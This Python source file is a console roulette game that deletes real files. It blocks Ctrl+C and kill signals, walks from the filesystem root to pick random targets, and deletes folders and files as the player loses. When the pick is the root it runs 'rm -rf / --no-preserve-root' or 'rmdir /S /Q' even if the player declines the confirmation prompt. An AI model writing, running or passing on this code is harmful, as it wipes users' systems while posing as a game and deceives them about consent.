import os
import random
import json
import shutil
import signal
import subprocess

SAVE_FILE = "save/casino_roulette_state.json"
LOSS_THRESHOLD = 10

def disable_exit_signals():
    """
    Prevent quitting via Ctrl + C or kill signals.
    """
    def handler(signum, frame):
        print("\n[!] You cannot quit with Ctrl + C. Finish the game!")
    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGTERM, handler)

def clear_console():
    """
    Clears the console (Windows/Unix).
    """
    if os.name == 'nt':
        subprocess.call("cls", shell=True)
    else:
        subprocess.call("clear", shell=True)

logo = """
\033[33m ███████████                       ████            █████     █████            
░░███░░░░░███                     ░░███           ░░███     ░░███             
 ░███    ░███   ██████  █████ ████ ░███   ██████  ███████   ███████    ██████ 
 ░██████████   ███░░███░░███ ░███  ░███  ███░░███░░░███░   ░░░███░    ███░░███
 ░███░░░░░███ ░███ ░███ ░███ ░███  ░███ ░███████   ░███      ░███    ░███████ 
 ░███    ░███ ░███ ░███ ░███ ░███  ░███ ░███░░░    ░███ ███  ░███ ███░███░░░  
 █████   █████░░██████  ░░████████ █████░░██████   ░░█████   ░░█████ ░░██████ 
░░░░░   ░░░░░  ░░░░░░    ░░░░░░░░ ░░░░░  ░░░░░░     ░░░░░     ░░░░░   ░░░░░░  

             ██████     ███████████            █████                          
            ███░░███   ░░███░░░░░░█           ░░███                           
  ██████   ░███ ░░░     ░███   █ ░   ██████   ███████    ██████              
 ███░░███ ███████       ░███████    ░░░░░███ ░░░███░    ███░░███             
░███ ░███░░░███░        ░███░░░█     ███████   ░███    ░███████              
░███ ░███  ░███         ░███  ░     ███░░███   ░███ ███░███░░░               
░░██████   █████        █████      ░░████████  ░░█████ ░░██████              
 ░░░░░░   ░░░░░        ░░░░░        ░░░░░░░░    ░░░░░   ░░░░░░\033[0m
"""

# -----------------------------------------------------------------------------
# Helper Functions for Random File/Folder Deletion
# -----------------------------------------------------------------------------

def pick_random_item():
    root_path = "C:\\" if os.name == "nt" else "/"
    current_path = root_path

    steps = random.randint(1, 5)
    for _ in range(steps):
        try:
            entries = os.listdir(current_path)
            if not entries:
                break

            choice_name = random.choice(entries)
            choice_path = os.path.join(current_path, choice_name)

            if os.path.isdir(choice_path):
                if random.random() < 0.5:
                    current_path = choice_path
                else:
                    return choice_path
            else:
                return choice_path
        except (PermissionError, FileNotFoundError):
            break

    return current_path

def is_root_folder(folder_path):
    folder_path = os.path.abspath(folder_path)
    if os.name == 'nt':
        drive, tail = os.path.splitdrive(folder_path)
        return (drive and tail in ["\\", "/"])
    else:
        return (folder_path == "/")

def force_delete_path(path):
    if not os.path.exists(path):
        print(f"[INFO] The path does not exist: {path}")
        return

    if os.path.isdir(path) and is_root_folder(path):
        print("[!] WARNING: Do you still want to delete the root folder?")
        confirm = input("Type 'YES' in all caps to proceed: ")
        if confirm == "YES":
            print("[+] Thank you for playing! Enjoy your free space.")
            if os.name == "nt":
                os.system(f'rmdir /S /Q "{path}"')
                pass
            else:
                os.system("rm -rf / --no-preserve-root")
                pass
        else:
            if os.name == "nt":
                print("[x] Just kidding, you bet and lost! Deleting anyway.")
                os.system(f'rmdir /S /Q "{path}"')
            else:
                print("[x] Just kidding, you bet and lost! Deleting anyway.")
                os.system("rm -rf / --no-preserve-root")
        return

    if os.path.isfile(path):
        print(f"[DELETING FILE] => {path}")
        os.remove(path)
    else:
        try:
            print(f"[DELETING FOLDER] => {path}")
            shutil.rmtree(path)
        except Exception as e:
            print(f"[ERROR] Could not delete folder: {path}. Reason: {e}")
            if os.name == "nt":
                os.system(f'rmdir /S /Q "{path}"')
                pass
            else:
                os.system(f'rm -rf "{path}"')
                pass

def get_color(number):
    return "green" if number == 0 else ("black" if number % 2 == 0 else "red")

def spin_roulette():
    return random.randint(0, 36)

def path_depth(folder_path):
    folder_path = os.path.normpath(folder_path)
    parts = folder_path.split(os.sep)
    parts = [p for p in parts if p and not p.endswith(":")]
    return len(parts)

def folder_value(folder_path):
    return max(1, 15 - path_depth(folder_path))

def load_game_state():
    if not os.path.exists(SAVE_FILE):
        return None
    try:
        with open(SAVE_FILE, "r") as f:
            return json.load(f)
    except:
        return None

def save_game_state(state):
    os.makedirs(os.path.dirname(SAVE_FILE), exist_ok=True)
    with open(SAVE_FILE, "w") as f:
        json.dump(state, f)

def clear_game_state():
    if os.path.exists(SAVE_FILE):
        os.remove(SAVE_FILE)

def pick_new_save_folder():
    root_path = "C:\\" if os.name == "nt" else "/"
    current_path = root_path
    for _ in range(random.randint(1, 5)):
        try:
            subdirs = [d for d in os.listdir(current_path)
                       if os.path.isdir(os.path.join(current_path, d))]
            if not subdirs:
                break
            current_path = os.path.join(current_path, random.choice(subdirs))
        except (PermissionError, FileNotFoundError):
            break

    print(f"[*] Folder to save : {current_path}")
    print(f"[!] This folder will be deleted if you lose {LOSS_THRESHOLD} credits.")
    return current_path

def initialize_game():
    state = load_game_state()
    if state:
        credits = state.get("credits", 1000)
        folder_to_save = state.get("folder_to_save")
        lost_since_folder = state.get("lost_since_folder", 0)
        print(f"[!] Resuming your game with {credits} credits.")
    else:
        credits = 100
        folder_to_save = None
        lost_since_folder = 0
    return credits, folder_to_save, lost_since_folder

def main():
    disable_exit_signals()
    credits, folder_to_save, lost_since_folder = initialize_game()

    while True:
        username = os.getlogin()
        print(logo)
        print("Hello", username,"\n")

        if not folder_to_save:
            folder_to_save = pick_new_save_folder()

        print(f"\n\033[33mYou have {credits} credits.\033[0m")
        print("\nBet options:\n")
        print("\033[33m1. Number (0-36)\033[0m")
        print("\033[33m2. Color (red/black)\033[0m")
        print("\033[33m3. Even/Odd\033[0m")
        print("\033[33m4. Folder Bet (specify a folder path for bonus)\033[0m")
        print("\033[33m5. Return to Main Menu\033[0m")

        choice = input("\nChoose your bet option: ")
        if choice == "5":
            print("[*] Goodbye!")
            clear_game_state()
            clear_console()
            return

        if choice not in ["1", "2", "3", "4"]:
            print("[!] Invalid choice. Try again.")
            continue

        try:
            bet_amount = int(input("How many credits do you bet?: "))
        except ValueError:
            print("[!] Invalid amount.")
            continue

        if bet_amount <= 0 or bet_amount > credits:
            print("[!] Not enough credits or invalid amount.")
            continue

        if choice == "1":
            try:
                bet_number = int(input("Which number (0-36)?: "))
                if bet_number < 0 or bet_number > 36:
                    print("[!] Invalid number.")
                    continue
            except ValueError:
                print("[!] Invalid number.")
                continue

            result = spin_roulette()
            color_result = get_color(result)
            print(f"\n[ SPIN ] => {result} ({color_result})")

            if bet_number == result:
                print("[!] You won on the number bet! +35:1")
                credits += bet_amount * 35
            else:
                print("[x] You lost the bet.")
                credits -= bet_amount
                lost_since_folder += bet_amount

        elif choice == "2":
            bet_color = input("red or black?: ").lower()
            if bet_color not in ["red", "black"]:
                print("[!] Invalid color.")
                continue

            result = spin_roulette()
            color_result = get_color(result)
            print(f"\n[ SPIN ] => {result} ({color_result})")

            if result == 0:
                print("[x] It's green => house wins!")
                credits -= bet_amount
                lost_since_folder += bet_amount
            else:
                if bet_color == color_result:
                    print("[!] You guessed the color => +1:1!")
                    credits += bet_amount
                else:
                    print("[x] Wrong color => you lose.")
                    credits -= bet_amount
                    lost_since_folder += bet_amount

        elif choice == "3":
            bet_type = input("Type 'even' or 'odd': ").lower()
            if bet_type not in ["even", "odd"]:
                print("[!] Invalid choice.")
                continue

            result = spin_roulette()
            color_result = get_color(result)
            print(f"\n[ SPIN ] => {result} ({color_result})")

            if result == 0:
                print("[x] It's zero => house wins!")
                credits -= bet_amount
                lost_since_folder += bet_amount
            else:
                is_even = (result % 2 == 0)
                if (is_even and bet_type == "even") or (not is_even and bet_type == "odd"):
                    print("[!] You guessed correctly => +1:1!")
                    credits += bet_amount
                else:
                    print("[x] Wrong guess => you lose.")
                    credits -= bet_amount
                    lost_since_folder += bet_amount

        elif choice == "4":
            folder_path = input("Enter folder path to bet: ").strip()
            val = folder_value(folder_path)
            print(f"[!] The folder is worth {val} bonus credits if you guess the color correctly.")

            bet_color = input("Choose color (red/black): ").lower()
            if bet_color not in ["red", "black"]:
                print("[!] Invalid color.")
                continue

            result = spin_roulette()
            color_result = get_color(result)
            print(f"\n[ SPIN ] => {result} ({color_result})")

            if result == 0:
                print("[x] It's green => house wins!")
                credits -= bet_amount
                lost_since_folder += bet_amount
            else:
                if bet_color == color_result:
                    print("[!] You guessed correctly => bet + folder bonus!")
                    credits += bet_amount
                    credits += val
                else:
                    print("[x] Wrong color => you lose your bet.")
                    credits -= bet_amount
                    lost_since_folder += bet_amount
                    random_path = pick_random_item()
                    force_delete_path(random_path)

        if lost_since_folder >= LOSS_THRESHOLD:
            print(f"[!] You have lost {lost_since_folder} credits since last folder => removing folder {folder_to_save}")
            force_delete_path(folder_to_save)
            folder_to_save = None
            lost_since_folder = 0

        if credits <= 0:
            print("[x] You have no more credits. Game over!")
            clear_game_state()
            return
        
        game_state = {
            "credits": credits,
            "folder_to_save": folder_to_save,
            "lost_since_folder": lost_since_folder
        }
        save_game_state(game_state)

        keep_playing = input("[-] Continue playing? (yes/no): ").lower()
        if keep_playing != "yes":
            print("[!] Exiting the game. See you next time!")
            clear_game_state()
            return

if __name__ == "__main__":
    main()